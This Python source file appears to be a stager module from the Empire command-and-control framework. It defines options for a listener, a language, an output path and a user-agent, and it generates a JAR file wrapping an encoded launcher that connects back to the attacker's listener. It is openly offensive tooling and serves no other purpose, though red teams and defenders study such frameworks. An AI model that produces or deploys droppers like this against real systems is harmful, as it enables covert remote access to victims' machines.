from empire.server.common import helpers


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Jar",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                }
            ],
            "Description": "Generates a JAR file.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "File to output jar to.",
                "Required": True,
                "Value": "/tmp/out.jar",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]

        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language=language,
            encode=True,
            user_agent=user_agent,
        )

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        launcher = launcher.replace('"', '\\"')
        return self.mainMenu.stagergenv2.generate_jar(launcher_code=launcher)
